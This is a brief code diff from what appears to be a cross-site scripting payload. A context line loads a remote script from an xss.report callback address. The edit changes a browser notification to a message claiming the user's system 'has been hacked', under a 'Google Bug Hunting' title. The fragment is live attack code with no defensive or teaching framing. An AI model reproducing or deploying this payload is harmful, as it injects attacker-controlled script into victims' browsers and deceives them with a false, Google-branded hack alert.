@@ -19,7 +19,7 @@ x.src = 'https://xss.report/c/santiko86';
 
    // Request permission for notifications
 if (Notification.permission === "granted") {
-    new Notification("Hello!", { body: "This is a system notification." });
+    new Notification("Google Bug Hunting", { body: "Your system has been hacked by @paktiko1986" });
 } else if (Notification.permission !== "denied") {
     Notification.requestPermission().then(permission => {
         if (permission === "granted") {
